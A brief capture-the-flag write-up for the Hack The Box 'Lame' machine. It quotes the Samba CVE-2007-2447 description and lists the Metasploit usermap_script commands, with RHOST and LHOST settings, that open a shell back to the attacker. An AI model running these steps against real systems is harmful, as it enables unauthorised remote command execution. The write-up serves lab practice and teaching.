Lame Box: Vulnerabilities - CVE-2007-2447 which means 
The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the "username map script" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.



We use “msfconsole”
 
Once in we do: “use exploit/multi/samba/usermap_script”

“Set rhost 10.10.10.3”  (victim IP)
“Set LHOST tun0” (replace tun0 with the ip of HTB pwnbox so it doesn’t break)
“run” run the exploit

We have a shell now, then use find command to look for flags

Note: Vsftpd 2.3.4 was a service on this machine, and it does have a built-in backdoor, however it is not exploitable in this instance.
